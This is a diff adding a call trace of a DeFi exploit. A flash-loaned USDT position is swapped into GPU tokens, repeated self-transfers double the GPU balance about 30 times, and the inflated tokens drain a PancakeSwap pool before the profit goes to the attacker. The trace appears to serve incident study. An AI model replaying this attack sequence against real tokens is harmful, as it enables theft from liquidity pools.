@@ -1,0 +1,127 @@
+[1][CREATE] from=0xcc7806, to=0x523400, atInversebrahint248() -> 0x608060
+  [2][CREATE] from=0x523400, to=0x1334fc, atInversebrahint248() -> 0x608060
+    [3][STATICCALL] from=0x1334fc, to=BEP20USDT, decimals() -> 18
+    [3][STATICCALL] from=0x1334fc, to=GPU, decimals() -> 18
+  [2][CALL] from=0x523400, to=0x1334fc, 0x5acb6009() -> None
+    [3][STATICCALL] from=0x1334fc, to=BEP20USDT, balanceOf(account(address): 0x6098A5) -> 226007684814310683599320
+    [3][CALL] from=0x1334fc, to=DPP, flashLoan(baseAmount(uint256): 0, quoteAmount(uint256): 226007684814310683599320, assetTo(address): 0x1334fC, data(bytes): b'0x00') -> None
+      [4][DELEGATECALL] from=DPP, to=DPP, flashLoan(baseAmount(uint256): 0, quoteAmount(uint256): 226007684814310683599320, assetTo(address): 0x1334fC, data(bytes): b'0x00') -> None
+        [5][CALL] from=DPP, to=BEP20USDT, transfer(recipient(address): 0x1334fC, amount(uint256): 226007684814310683599320) -> True
+        [5][CALL] from=DPP, to=0x1334fc, DPPFlashLoanCalladdress() -> None
+          [6][CALL] from=0x1334fc, to=BEP20USDT, approve(spender(address): 0x10ED43, amount(uint256): 226007684814310683599320) -> True
+          [6][CALL] from=0x1334fc, to=PancakeRouter, swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn(uint256): 226007684814310683599320, amountOutMin(uint256): 1, path(address[]): ['0x55d398326f99059fF775485246999027B31979..., to(address): 0x1334fC, deadline(uint256): 1715162499) -> None
+            [7][CALL] from=PancakeRouter, to=BEP20USDT, transferFrom(sender(address): 0x1334fC, recipient(address): 0x613730, amount(uint256): 226007684814310683599320) -> True
+            [7][STATICCALL] from=PancakeRouter, to=GPU, balanceOf(account(address): 0x1334fC) -> 0
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['32666057895841703902864', '30903990987461173215594', '1715157349']
+            [7][STATICCALL] from=PancakeRouter, to=BEP20USDT, balanceOf(account(address): 0x613730) -> 258673742710152387502184
+            [7][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 0, amount1Out(uint256): 26992803697364241636753, to(address): 0x1334fC, data(bytes): b'') -> None
+              [8][CALL] from=PancakePair, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 26992803697364241636753) -> True
+              [8][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x613730) -> 258673742710152387502184
+              [8][STATICCALL] from=PancakePair, to=GPU, balanceOf(account(address): 0x613730) -> 3911187290096931578894
+            [7][STATICCALL] from=PancakeRouter, to=GPU, balanceOf(account(address): 0x1334fC) -> 26183019586443314387599
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 26183019586443314387599
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 26183019586443314387599
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 26183019586443314387599) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 52363420870927984436161
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 52363420870927984436161) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 104721605399768876067718
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 104721605399768876067718) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 209432738638997775240112
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 209432738638997775240112) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 418844534004131650702588
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 418844534004131650702588) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 837647183554862888237518
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 837647183554862888237518) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 1675210602391370290178695
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 1675210602391370290178695) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 3350253683722501443319678
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 3350253683722501443319678) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 6700172342076630636485347
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 6700172342076630636485347) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 13399674666919053609901699
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 13399674666919053609901699) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 26798009366371415314440709
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 26798009366371415314440709) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 53593338931806193487349265
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 53593338931806193487349265) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 107181318529719206355340531
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 107181318529719206355340531) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 214351918927585440790044997
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 214351918927585440790044997) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 428682402663278123036005993
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 428682402663278123036005993) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 857321937086289918259702393
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 857321937086289918259702393) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 1714558141978871207527576423
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 1714558141978871207527576423) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 3428944828143544527934393666
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 3428944828143544527934393666) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 6857546761804274701415990227
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 6857546761804274701415990227) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 13714407768932368975361838628
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 13714407768932368975361838628) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 27427444097087844713826132445
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 27427444097087844713826132445) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 54852145449765980643180879832
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 54852145449765980643180879832) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 109698805684986984688297431745
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 109698805684986984688297431745) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 219386641489405470678126032002
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 219386641489405470678126032002) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 438751344314662000809184249399
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 438751344314662000809184249399) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 877458813494892535418287570975
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 877458813494892535418287570975) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 1754829881108435581583033312218
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 1754829881108435581583033312218) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 3509484279228760319607908318887
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 3509484279228760319607908318887) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 7018617610029597763183855838056
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 7018617610029597763183855838056) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 14036533358298192566591393282473
+          [6][CALL] from=0x1334fc, to=GPU, transfer(recipient(address): 0x1334fC, amount(uint256): 14036533358298192566591393282473) -> True
+          [6][STATICCALL] from=0x1334fc, to=GPU, balanceOf(account(address): 0x1334fC) -> 28071663063260555313926127423145
+          [6][CALL] from=0x1334fc, to=GPU, approve(spender(address): 0x10ED43, amount(uint256): 28071663063260555313926127423145) -> True
+          [6][CALL] from=0x1334fc, to=PancakeRouter, swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn(uint256): 28071663063260555313926127423145, amountOutMin(uint256): 1, path(address[]): ['0xf51CBf9F8E089Ca48e454EB79731037a405972..., to(address): 0x1334fC, deadline(uint256): 1715162499) -> None
+            [7][CALL] from=PancakeRouter, to=GPU, transferFrom(sender(address): 0x1334fC, recipient(address): 0x613730, amount(uint256): 28071663063260555313926127423145) -> True
+              [8][STATICCALL] from=GPU, to=PancakePair, token0() -> 0x55d398
+              [8][STATICCALL] from=GPU, to=PancakePair, getReserves() -> ['258673742710152387502184', '3911187290096931578894', '1715162499']
+              [8][STATICCALL] from=GPU, to=BEP20USDT, balanceOf(account(address): 0x613730) -> 258673742710152387502184
+              [8][CALL] from=GPU, to=PancakeRouter, swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn(uint256): 134964018486821208183, amountOutMin(uint256): 0, path(address[]): ['0xf51CBf9F8E089Ca48e454EB79731037a405972..., to(address): 0x301f7e, deadline(uint256): 1715162499) -> None
+                [9][CALL] from=PancakeRouter, to=GPU, transferFrom(sender(address): 0xf51CBf, recipient(address): 0x613730, amount(uint256): 134964018486821208183) -> True
+                [9][STATICCALL] from=PancakeRouter, to=BEP20USDT, balanceOf(account(address): 0x301f7e) -> 0
+                [9][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['258673742710152387502184', '3911187290096931578894', '1715162499']
+                [9][STATICCALL] from=PancakeRouter, to=GPU, balanceOf(account(address): 0x613730) -> 4046151308583752787077
+                [9][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 8607506313202749974239, amount1Out(uint256): 0, to(address): 0x301f7e, data(bytes): b'') -> None
+                  [10][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x301f7e, amount(uint256): 8607506313202749974239) -> True
+                  [10][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x613730) -> 250066236396949637527945
+                  [10][STATICCALL] from=PancakePair, to=GPU, balanceOf(account(address): 0x613730) -> 4046151308583752787077
+                [9][STATICCALL] from=PancakeRouter, to=BEP20USDT, balanceOf(account(address): 0x301f7e) -> 8607506313202749974239
+              [8][CALL] from=GPU, to=0x301f7e, withdraw() -> 0x000000
+                [9][STATICCALL] from=0x301f7e, to=BEP20USDT, balanceOf(account(address): 0x301f7e) -> 8607506313202749974239
+                [9][CALL] from=0x301f7e, to=BEP20USDT, transfer(recipient(address): 0xf51CBf, amount(uint256): 8607506313202749974239) -> True
+              [8][STATICCALL] from=GPU, to=BEP20USDT, balanceOf(account(address): 0xf51CBf) -> 8607506313202749974239
+              [8][CALL] from=GPU, to=PancakeRouter, addLiquidity(tokenA(address): 0x55d398, tokenB(address): 0xf51CBf, amountADesired(uint256): 8607506313202749974239, amountBDesired(uint256): 134964018486821208183, amountAMin(uint256): 0, amountBMin(uint256): 0, to(address): 0x5bB6FA, deadline(uint256): 1715162499) -> ['8341246181379455136994', '134964018486821208183', '1056792697232305087725']
+                [9][STATICCALL] from=PancakeRouter, to=PancakeFactory, getPair((address): 0xf51CBf) -> 0x613730
+                [9][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['250066236396949637527945', '4046151308583752787077', '1715162499']
+                [9][CALL] from=PancakeRouter, to=BEP20USDT, transferFrom(sender(address): 0xf51CBf, recipient(address): 0x613730, amount(uint256): 8341246181379455136994) -> True
+                [9][CALL] from=PancakeRouter, to=GPU, transferFrom(sender(address): 0xf51CBf, recipient(address): 0x613730, amount(uint256): 134964018486821208183) -> True
+                [9][CALL] from=PancakeRouter, to=PancakePair, mint(to(address): 0x5bB6FA) -> 1056792697232305087725
+                  [10][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x613730) -> 258407482578329092664939
+                  [10][STATICCALL] from=PancakePair, to=GPU, balanceOf(account(address): 0x613730) -> 4181115327070573995260
+                  [10][STATICCALL] from=PancakePair, to=PancakeFactory, feeTo() -> 0x0ed943
+            [7][STATICCALL] from=PancakeRouter, to=BEP20USDT, balanceOf(account(address): 0x1334fC) -> 0
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['258407482578329092664939', '4181115327070573995260', '1715162499']
+            [7][STATICCALL] from=PancakeRouter, to=GPU, balanceOf(account(address): 0x613730) -> 27226790224226717707713466758244
+            [7][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 258407482538546976394409, amount1Out(uint256): 0, to(address): 0x1334fC, data(bytes): b'') -> None
+              [8][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x1334fC, amount(uint256): 258407482538546976394409) -> True
+              [8][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x613730) -> 39782116270530
+              [8][STATICCALL] from=PancakePair, to=GPU, balanceOf(account(address): 0x613730) -> 27226790224226717707713466758244
+            [7][STATICCALL] from=PancakeRouter, to=BEP20USDT, balanceOf(account(address): 0x1334fC) -> 258407482538546976394409
+          [6][CALL] from=0x1334fc, to=BEP20USDT, transfer(recipient(address): 0x6098A5, amount(uint256): 226007684814310683599320) -> True
+          [6][STATICCALL] from=0x1334fc, to=BEP20USDT, balanceOf(account(address): 0x1334fC) -> 32399797724236292795089
+          [6][CALL] from=0x1334fc, to=BEP20USDT, transfer(recipient(address): 0xcC7806, amount(uint256): 32399797724236292795089) -> True
+        [5][STATICCALL] from=DPP, to=WBNB, balanceOf((address): 0x6098A5) -> 262863567031873919322
+        [5][STATICCALL] from=DPP, to=BEP20USDT, balanceOf(account(address): 0x6098A5) -> 226007684814310683599320
+        [5][STATICCALL] from=DPP, to=WBNB, balanceOf((address): 0x6098A5) -> 262863567031873919322
+        [5][STATICCALL] from=DPP, to=BEP20USDT, balanceOf(account(address): 0x6098A5) -> 226007684814310683599320
